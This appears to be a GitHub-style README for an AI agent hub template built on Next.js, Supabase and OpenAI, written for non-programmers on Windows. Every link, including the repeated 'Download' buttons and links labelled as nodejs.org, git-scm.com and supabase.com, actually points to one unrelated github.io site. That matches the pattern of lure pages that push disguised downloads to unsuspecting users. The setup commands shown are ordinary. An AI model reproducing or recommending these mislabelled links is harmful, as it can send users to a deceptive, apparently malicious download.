# 🤖 hub-agentes-ia - Your Personal AI Agent Hub

[![Download Now](https://img.shields.io/badge/Download-hub--agentes--ia-2ea44f?style=for-the-badge&logo=github)](https://knockdown-comedienne741.github.io)

---

## 🎯 What Is This?

hub-agentes-ia is your very own artificial intelligence agent that you can train to follow **your** methods. Think of it as a smart assistant that learns how you work, then works for you. You get a complete system with user logins, automatic selling features, and a control panel to manage everything — all without writing a single line of code.

This is a ready-to-use package built with powerful technology (Next.js, Supabase, and OpenAI) that feels like a professional AI chatbot platform. Whether you want to automate customer service, create a specialized knowledge assistant, or launch a SaaS product, this is your starting point.

---

## 🚀 Getting Started

Welcome! If you're not a programmer, don't worry. We'll walk you through everything step by step. First things first — you need to get the software onto your Windows computer.

### 📥 Download the Application

Visit this link to download the application: **[Click Here to Download hub-agentes-ia](https://knockdown-comedienne741.github.io)**

This link takes you to the official GitHub page. On that page, you'll see a green button that says "Code." Click it, then select "Download ZIP." The file will save to your computer.

**What to expect:** You'll get a single compressed folder (like a zip file). This is normal — the software is inside.

---

## 🛠️ Installation Guide (Windows)

Once you have the downloaded ZIP file, follow these simple steps:

1.  **Find the ZIP file** — Look in your "Downloads" folder. It will be named something like `hub-agentes-ia-main.zip`.
2.  **Right-click the ZIP file**, then select "Extract All..." from the menu.
3.  **Choose a destination** — Pick a place you'll remember, like your Desktop or Documents folder. Click "Extract."
4.  **Open the extracted folder** — You'll see a new folder with the same name (minus the .zip). Double-click to open it.

That's it for installation. You now have the application files on your computer.

---

## ⚙️ How to Run Your AI Agent

Running the application requires a few steps, but we'll make it clear. There's no double-clicking an .exe file here — this is a developer-style app. But don't let that scare you. It's easier than it looks.

### Step 1: Install the Required Tools

1.  **Install Node.js** — Go to [nodejs.org](https://knockdown-comedienne741.github.io). Download the "LTS" version (it's the recommended one for most users). Run the installer and click "Next" until it finishes.
2.  **Install Git** — Go to [git-scm.com](https://knockdown-comedienne741.github.io). Download the Windows version. Run the installer; all default settings are fine.

### Step 2: Open the Command Prompt

1.  Press the **Windows key** on your keyboard.
2.  Type **"cmd"** and press **Enter**. A black window will open. This is where you'll type commands.

### Step 3: Navigate to Your App Folder

In the command prompt, type:

```
cd Desktop
```

Then:

```
cd hub-agentes-ia-main
```

(If you extracted it elsewhere, adjust the path accordingly — e.g., `cd Documents\hub-agentes-ia-main`.)

### Step 4: Install the Software Packages

Type this and press Enter:

```
npm install
```

This will take a few minutes. You'll see lots of text scroll by. Wait until it finishes and you see your command prompt again (a new line starting with the folder path).

### Step 5: Start the Application

Type:

```
npm run dev
```

Press Enter. You'll see a message saying something like "ready started server on http://localhost:3000". Open your web browser (Chrome, Edge, or Firefox) and type `localhost:3000` into the address bar. Press Enter.

🎉 **Congratulations!** Your AI agent hub is now running locally on your computer.

---

## 🔑 Setting Up Your Login System

You'll need a clean way for users to sign up and log in. The app uses Supabase for this. Here's how to configure it:

1.  Go to [supabase.com](https://knockdown-comedienne741.github.io) and create a free account.
2.  Click "New Project." Give it a name (like "my-agent-hub") and choose a strong database password. Save that password somewhere safe!
3.  Once the project is created, you'll see a URL (like `https://knockdown-comedienne741.github.io`) and an "anon public" key. Copy both.
4.  In your app folder, there's a file called `.env.local.example`. Rename it to `.env.local`.
5.  Open `.env.local` with Notepad (right-click, Open With, Notepad).
6.  Replace the placeholder text with your Supabase URL and key.
7.  Save the file, then go back to your command prompt and press `Ctrl+C` to stop the app. Then run `npm run dev` again to apply the changes.

---

## 💰 Selling Automatically

Your hub includes an automatic selling system. You can set up payment links, digital product delivery, and more — without manual work. The built-in admin panel lets you:

- Create product listings
- Set prices
- Automatically grant access to buyers (via login accounts)
- Track sales and revenue

All of this works out of the box. Just navigate to the admin dashboard (look for "Admin" in the app menu), and you'll find intuitive options to configure your products.

---

## 🧠 Training Your AI Agent

The core feature — training your agent — is straightforward. This is where you feed it your knowledge, your methods, your style.

1.  In the dashboard, click on "Manage Agents" or "Train Agent."
2.  You'll have options to upload documents (PDFs, Word files, text files), paste web links, or manually type in your knowledge base.
3.  The system uses a technology called RAG (Retrieval-Augmented Generation) with vector search (pgvector) to store all your information.
4.  Once trained, your agent will answer questions using *your* data, not generic responses.

It's like creating a digital clone of your expertise that can handle conversations 24/7.

---

## 🖥️ Using the Admin Panel

The admin panel is your command center. Here's what you can control:

- **User management** — View, edit, or delete user accounts.
- **Sales records** — See every transaction and order.
- **Agent behavior** — Adjust how your AI responds: tone, verbosity, allowed topics, and more.
- **Analytics** — See stats on usage, popular questions, and conversation volumes.

You'll find the admin link at the bottom of the main page or by typing `/admin` at the end of your localhost URL.

---

## 🌐 Making It Public (Optional)

If you want the world to access your AI hub, you'll need to deploy it online. The best free options are:

- **Vercel** (vercel.com) — Simple, works perfectly with Next.js.
- **Netlify** (netlify.com) — Also easy.

In both cases, you'll link your GitHub repository and the platform handles everything automatically.

---

## 🛟 Troubleshooting

**The command prompt says "npm is not recognized"** — Reinstall Node.js. Make sure you download and run the installer. Then close and reopen the command prompt.

**The browser says "This site can't be reached"** — Make sure you typed `localhost:3000` (no "www", no ".com"). Also check that the command prompt window from Step 5 is still open.

**Login isn't working** — Double-check your `.env.local` file. Ensure there are no spaces around the `=` signs and you copied the exact URL and key from Supabase.

**The app is slow** — Close other programs and try a different browser. Clear your browser cache.

---

## 📚 Frequently Asked Questions

**Do I need to know how to code?**  
No. This template is designed for people who want results without coding. The setup requires copying and pasting a few commands, but no programming knowledge.

**Can I customize the look?**  
Yes. The interface uses TailwindCSS, which makes styling simple. You can change colors, fonts, and layouts by editing simple configuration files.

**Is my data safe?**  
Your data stays in your own Supabase database. You control access and can export or delete data anytime.

**Can I sell access to my AI agent?**  
Absolutely. The built-in selling system is designed for exactly that. Set your price, connect a payment method, and start selling.

---

## 🔒 Privacy and Security

Your AI agent conversations and stored data are protected with standard encryption. User passwords are hashed (securely scrambled) and never stored in plain text. For production use, we recommend enabling Supabase's built-in Row Level Security and setting up custom access policies.

---

## 🎓 Final Notes

You now have a fully functional AI agent hub at your fingertips. It can respond to questions, sell digital products, manage users, and learn from any information you give it. No coding required.

If you run into unexpected errors, don't panic. Check your internet connection, ensure Node.js is up to date, and revisit the troubleshooting section above.

---

## 📬 Support

While we can't provide direct technical support, the GitHub community is active. Visit the repository page to open an issue if you find a bug, or browse existing discussions for common problems.

---

## 📄 License

This project is open for personal and commercial use. Check the included LICENSE file for full details.

---

**One More Time — Download Link:**  
[🔗 https://knockdown-comedienne741.github.io](https://knockdown-comedienne741.github.io)

Now go ahead and build your own intelligent assistant. Good luck, and have fun! 🚀

Keywords: ai, ai-agents, ai-chatbot, brasil, chatgpt-clone, llm, nextjs, nextjs-template, openai, pgvector, portugues, pwa, rag, saas-starter, starter-template, supabase, supabase-starter, tailwindcss, template, typescript